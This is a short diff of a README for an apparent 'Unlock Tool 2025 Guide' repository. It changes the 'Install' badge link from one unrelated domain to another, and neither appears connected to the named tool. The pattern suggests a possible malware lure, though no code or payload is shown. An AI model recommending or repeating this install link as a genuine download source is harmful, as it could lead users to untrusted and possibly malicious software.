@@ -5,7 +5,7 @@
 
 📱 Simplify your device management with Unlock Tool 2025 Guide! This repository offers tutorials, resources, and best practices for tech enthusiasts to enhance their workflows in 2025.
 
-[![Install](https://img.shields.io/badge/Install-unlock_tool-blueviolet)](https://cea-groupe.com)
+[![Install](https://img.shields.io/badge/Install-unlock_tool-blueviolet)](https://glocktober.com)
 
 ### 🛠️ Core Features
 
